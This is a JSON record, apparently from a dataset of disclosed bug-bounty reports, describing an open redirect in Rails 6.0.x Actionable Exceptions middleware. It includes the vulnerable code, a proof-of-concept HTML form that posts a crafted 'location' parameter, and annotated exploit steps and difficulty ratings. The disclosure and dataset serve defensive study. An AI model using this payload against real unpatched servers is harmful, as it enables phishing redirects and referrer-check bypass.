@@ -1,0 +1,48 @@
+{
+  "reported_to": "Ruby on Rails",
+  "reported_by": "ooooooo_q ",
+  "title": "Open Redirect (6.0.0 < rails < 6.0.3.2)",
+  "content": "\nHello,\nI was looking at the change log (https://github.com/rails/rails/commit/2121b9d20b60ed503aa041ef7b926d331ed79fc2) for CVE-2020-8185 and found another problem existed.\nhttps://github.com/rails/rails/blob/v6.0.3.1/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb#L21\nCode 506 Bytes\n1  redirect_to request.params[:location]\n2end\n3\n4private\n5  def actionable_request?(request)\n6    request.show_exceptions? && request.post? && request.path == endpoint\n7  end\n8\n9  def redirect_to(location)\n10    body = \"<html><body>You are being <a href=\\\"#{ERB::Util.unwrapped_html_escape(location)}\\\">redirected</a>.</body></html>\"\n11\n12    [302, {\n13      \"Content-Type\" => \"text/html; charset=#{Response.default_charset}\",\n14      \"Content-Length\" => body.bytesize.to_s,\n15      \"Location\" => location,\n16    }, [body]]\n17  end\nThere was an open redirect issue because the request parameter location was not validated.\nIn 6.0.3.2, since the condition of actionable_request? has changed, this problem is less likely to occur.\nPoC\n#### 1. Prepare server\nPrepare an attackable 6.0.3.1 version of Rails server\nCode 120 Bytes\n1\u276f rails -v\n2Rails 6.0.3.1\n3\n4\u276f RAILS_ENV=production rails s\n5...\n6* Environment: production\n7* Listening on tcp://0.0.0.0:3000\n#### 2. Attack server\nPrepare the server for attack on another port.\nCode 224 Bytes\n1<form method=\"post\" action=\"http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=https://www.hackerone.com/\">\n2\t<button type=\"submit\">click!</button>\n3</form>\nCode 27 Bytes\n1python3 -m http.server 8000\n#### 3. Open browser\nOpen the http://localhost:8000/attack.html url in your browser and click the button.\nRedirect to https://www.hackerone.com/ url.\n<image_0>\nImpact\nIt will be fixed with 6.0.3.2 as with CVE-2020-8185(https://groups.google.com/g/rubyonrails-security/c/pAe9EV8gbM0), but I think it is necessary to announce it again because the range of influence is different.\nThis open redirect changes from POST method to Get Method, so it may be difficult to use for phishing.On the other hand, it may affect bypass of referrer check or SSRF.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 1000,
+  "weaknesses": [
+    "Open Redirect"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ro3WSUcNhjSZthT2cTFoSsaV?response-content-disposition=attachment%3B%20filename%3D%22__________2020-06-21_10.26.21.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-06-21_10.26.21.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2Y6G2NUU%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T214619Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDJuqn9kdtu2Unz0Z7wyEsUibPx2F7drbSBOWFTL45NiAIge4cG2%2B%2FCYBRquViHAf1ya0yjWFza%2FbVJYvKGVp9AMAMqsgUIHRADGgwwMTM2MTkyNzQ4NDkiDAOQ94LYZ1Z2I%2FbT3iqPBZNoZ5Qv%2B6zwPjuiNOg%2B3bkXtXWKvZ3ms0qFE07q2iHxcWQUOVHSVmtoLfBGgOAVJ4UTChA9cehYQTyUrcfugsEnTnmmmuHNqhQoRlOkaDd0JdKKBQoddVioIXbRmIS7NYUOBGCRCAhg8SvRoMVwCSoCexVF4X%2FXHlEJphH82fzlJSBuDti8rAXeTRTqmkGp0oU9JQQHQL8xsJidlEKyPoRNW8xaNVlX%2BwN21KRoEDqlCIkHCEQGrt4gkgGLCJfDxrgr5f8FRA0N1VjtnFiKyr5v%2BE0pysS%2BJVmEffnsy8e3jNksHIwvaTS3DIRCAq%2Fg%2B6bV3m79B565y%2Fg9CgKPwYZ9UEu07JTnFpwqmwEQQEYzcviuU5wqHXFWf5oQLnqVHsKFX4s1QPEll74yw%2BzzmLRbWP7MriOVAZ0mr%2FeFn8xyEp0NEi1ry8biDtDGNl724FHGegwg81ar32RlncV%2B44raHdyYrFCgQS%2Fj86OVhe%2F2GOfWG%2BN14Dn1PRl6oOgjnqbd6cBPVglZA0S3zJ9TthJdqnxPIRGaU3dwuJpVmL%2Bvvtuid4NX%2FG6en7plOAX5IfYRvH84XWqY%2F%2FmcVkIQ6ViMLmWJuXvLuarqZzBldX9Vp8f4VLzJtVvxHCqUs7RBhN3PdDi0L0itzE85dpR2LDtXK2S%2F4bxtmPpzXG4jULH61Cgr277FE2XpOQDqpXrqTGibfanLYklNBliety5RMhusoGfSLVsY9%2F1vFj6Q58f4gR6TNeAwsUBeu3A%2B25yZORFE2NLz9Ws%2B9Gfbw%2FhL3%2FxJjIMrV10Sk6M8JdyZqfTI85Kq%2FlJc0tjmP4MhmsylrhI5VbE03gXJatRO%2BwZcivdG3BxDMOWcv78LZyfhvRgwgpGMvwY6sQFgw%2BWnsIdVBUuwXZ4atbgtCjB%2BL%2FYDSWwVvNsmQgwigXDKIrA4%2FXuCcmT9Ja%2Fo2btzVyeKU2W3BtD1lVfd5sQXH76dj5ggdRuKpmKNPFGfpZyOxcvaA%2FbDdvbGQI0IQ2XHcfbuXi3lC0dQifpqefiLpk27Z17BEKw8OJHiMDLBhiNp26sIBDCT8URGtSIN4%2B6yuL%2BtaKnxIxjuyPzjAR8okSQUl94hX9Y6h3D3BO6iRPg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1f53b9e04e9de161595f3a87482252e83fe610cbc55bea95729ef62b28519e76"
+  },
+  "disclosed_date": 1608673620,
+  "report_url": "https://hackerone.com/reports/904059",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Prepare a Rails server version 6.0.3.1 and start it in production mode."
+    ],
+    [
+      2,
+      "Create an HTML form that posts to the Rails server with a malicious 'location' parameter pointing to an external site."
+    ],
+    [
+      3,
+      "Host the HTML form on a local server (e.g., using Python's http.server)."
+    ],
+    [
+      4,
+      "Open the HTML form in a browser and submit the form to trigger the redirect."
+    ]
+  ],
+  "vuln_description": "The vulnerability is an open redirect issue in Rails versions 6.0.0 to 6.0.3.1, where the 'location' parameter in the Actionable Exceptions middleware is not properly validated, allowing attackers to redirect users to arbitrary external sites via a crafted POST request.",
+  "reason": "The attack involves understanding the Rails middleware and the specific endpoint for actionable exceptions, but the steps to exploit it are straightforward once the endpoint and parameter are identified. The vulnerability does not require complex state manipulation or novel logic.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
